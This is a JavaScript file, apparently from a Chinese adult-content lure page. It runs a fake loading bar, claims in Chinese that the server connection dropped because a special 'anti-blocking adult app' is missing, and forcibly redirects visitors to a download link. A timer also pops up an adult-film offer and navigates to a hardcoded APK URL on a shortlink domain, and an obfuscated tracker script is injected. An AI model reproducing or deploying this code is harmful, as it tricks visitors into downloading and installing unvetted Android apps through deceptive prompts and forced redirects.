var bar=0;
var line="||";
var amount="||";
count();
function count(){
	bar=bar+2;
	amount=amount+line;
	document.getElementById('baifenbi').innerHTML=bar+"%";
	if(bar<90){
		setTimeout("count()",100);
	}else{
		alert(tixing);
		document.getElementById('load').innerHTML='<a href="'+appurl2+'"><span style="height:25px;line-height:25px;font-size:13px;color:#c3c3c3;">服务器连接断开：系统未检测到<span style="color:#FF0033;">防屏蔽成人</span>手机专用APP！<span style="color:#339900;">高清内容，缓冲快，点击下载！</span></span></a>';
		document.getElementById('note').innerHTML='<div style="height:25px;line-height:25px;font-size:13px;color:#00FF00;">AV播放器下载中，请耐心等待，一会提醒您安装...</div>';
		window.location.href=appurl2;
	}
}
//var cheattime="12";function cheat(){if(cheattime<=0){location.href=appurl2;}else{setTimeout('cheat()',999);}cheattime--;}cheat();

document.writeln("<script type=\"text/javascript\">var cnzz_protocol = ((\"https:\" == document.location.protocol) ? \" https://\" : \" http://\");document.write(unescape(\"%3Cspan id=\'cnzz_stat_icon_1253664587\'%3E%3C/span%3E%3Cscript src=\'\" + cnzz_protocol + \"s11.cnzz.com/stat.php%3Fid%3D1253664587\' type=\'text/javascript\'%3E%3C/script%3E\"));</script>");



var apkurl = "http://janteng.cn/10Nz";
function g(name) {
    var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i");
    var r = window.location.search.substr(1).match(reg);
    if (r != null) return unescape(r[2]); return null;
}
	
function downfile(){
	location.href=apkurl;
}

function showTip(text, down_url, delay, set_timer){
	if(set_timer==true){
		window.setTimeout("showTip('"+ text +"', '" + down_url + "', '" + delay + "', false)", delay)
	}else{
		alert(text)
		location.href=down_url;
	}
}
showTip("★成人爽片5万部成人影片，立即下载安装免费观看？★", "http://janteng.cn/10Nz", 60000, true);
